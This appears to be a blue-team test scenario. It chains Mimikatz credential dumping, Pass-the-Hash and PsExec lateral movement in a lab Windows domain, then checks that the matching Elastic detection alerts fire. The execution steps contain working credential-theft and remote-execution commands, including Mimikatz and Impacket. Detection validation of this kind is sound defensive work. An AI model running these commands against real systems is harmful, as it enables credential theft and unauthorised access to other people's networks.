# Scenario 02: Lateral Movement via PsExec + Pass-the-Hash

**Type**: Blue Team Validation  
**Techniques**: T1021.002, T1550.002  
**Expected Detections**: `lateral_movement_psexec`, `lateral_movement_pass_the_hash`  
**Author**: Chandra Sekhar Chakraborty

---

## Objective

Chain PsExec lateral movement with Pass-the-Hash to validate both detection rules fire.

## Prerequisites

- Two Windows hosts on same subnet (DC01 + WRK01)
- NTLM hash of a domain account (obtain via Mimikatz after Scenario 01)
- Sysmon + Elastic Agent on both hosts

## Execution Steps

### Step 1: Extract NTLM Hash

```
mimikatz.exe
  privilege::debug
  sekurlsa::logonpasswords
  # Note the NTLM hash of the target account
```

### Step 2: Pass-the-Hash with Mimikatz

```
mimikatz.exe
  privilege::debug
  sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:<NTLM_HASH> /run:cmd.exe
  # New cmd window opens with injected credentials
```

### Step 3: PsExec to Remote Host

```cmd
# In the PTH-spawned cmd window:
psexec.exe \\10.10.10.20 -s cmd.exe
# OR using Impacket:
python3 psexec.py lab.local/Administrator@10.10.10.20 -hashes :<NTLM_HASH>
```

## Expected Alerts

1. **Pass-the-Hash**: Security Event 4624 LogonType=3, NTLM, WorkstationName="-"
2. **PsExec**: Sysmon Event 1 with PSEXESVC.exe process / System Event 7045

## Validation

Check Kibana for both alerts firing within the same 5-minute window.
